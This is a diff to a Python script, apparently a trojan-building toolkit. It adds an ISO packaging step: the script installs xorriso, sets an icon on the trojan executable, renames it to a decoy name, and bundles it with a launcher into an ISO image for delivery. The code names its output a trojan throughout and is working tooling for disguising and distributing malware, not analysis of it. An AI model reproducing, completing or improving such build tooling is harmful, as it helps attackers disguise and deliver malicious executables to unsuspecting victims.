@@ -35,6 +35,8 @@ import shutil
 import base64
 import zipfile
 import subprocess
+from pathlib import Path
+
 
 # Optional WinRM dependency - imported lazily in step 4 / step 7
 try:
@@ -1079,6 +1081,30 @@ def step7_convert_trojan_to_exe():
 # STEP 8 — ISO CREATION
 # ==============================================================================
 
+
+def is_xorriso_installed():
+    try:
+        # Verify xorriso installation
+        subprocess.run(["xorriso", "--version"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        return True
+    except FileNotFoundError:
+        return False
+    except subprocess.CalledProcessError:
+        return False
+
+def install_xorriso():
+    info("Starting xorriso installation...")
+    try:
+        # Aggiorna prima l'indice dei pacchetti
+        subprocess.run(["sudo", "apt", "update"], check=True)
+        # Installa xorriso
+        subprocess.run(["sudo", "apt", "install", "-y", "xorriso"], check=True)
+        info("xorriso installed successfully!")
+    except subprocess.CalledProcessError:
+        info("Error installing xorriso. Check your permissions and internet connection.")
+        sys.exit(1)
+
+
 def step8_iso_creation():
     """
     STEP 8: Create an ISO file with:
@@ -1101,14 +1127,63 @@ def step8_iso_creation():
         "--set-icon",
         str(icon)
       ]
+      subprocess.run(cmd, check=True)
       info("icon inserted correctly")
     except Exception:
        warn(f"Could not insert icon in {TROJANNAME}.")
 
     
     # Create ISO
+    if not is_xorriso_installed():
+        install_xorriso()
     
+    # --- Step 1: rinomina TROJANNAME + ".exe" in EXENAME ---
+    exe = os.path.join(OUT_DIR, TROJANNAME + ".exe")
+    exe_dest = os.path.join(OUT_DIR, EXENAME)
+    if os.path.exists(exe_dest):
+        os.remove(exe_dest)
+    try:
+        os.rename(exe, exe_dest)
+    except Exception:
+        warn(f"File {exe} not found.")
+
+    try:
+        # --- Step 2: creare cartella iso_appo ---
+        iso_dir = os.path.join(OUT_DIR, "iso_appo")
+        os.makedirs(iso_dir, exist_ok=True)
+        # --- Step 3: copiare EXENAME e LAUNCHERNAME in iso_appo ---
+        src = os.path.join(OUT_DIR, EXENAME)
+        dest = os.path.join(iso_dir, EXENAME)      
+        if not os.path.exists(src):
+            raise FileNotFoundError(f"{src} file does not exist!")
+        shutil.copy(src, dest)
+        src = os.path.join(STUFF_DIR, LAUNCHERNAME)
+        dest = os.path.join(iso_dir, LAUNCHERNAME)         
+        if not os.path.exists(src):
+            raise FileNotFoundError(f"{src} file does not exist!")
+    except Exception:
+        warn(f"Problems preparing files to be inserted into the ISO container.")
     
+    shutil.copy(src, dest)
+    # --- Step 4: creare la ISO con xorriso ---
+    iso_path = os.path.join(OUT_DIR, ISONAME)    
+    try:
+        cmd = [
+            "xorriso",
+            "-as",
+            "mkisofs",
+            "-R",
+            "-J",            
+            "-o",
+            str(iso_path),
+            str(iso_dir)
+        ]
+        info(f"cmd: {cmd}")
+        subprocess.run(cmd, check=True)
+    except Exception:
+       warn(f"Could not create iso: {ISONAME}.")    
+    info(f"ISO created: {iso_path}") 
+ 
     
 
 # ==============================================================================
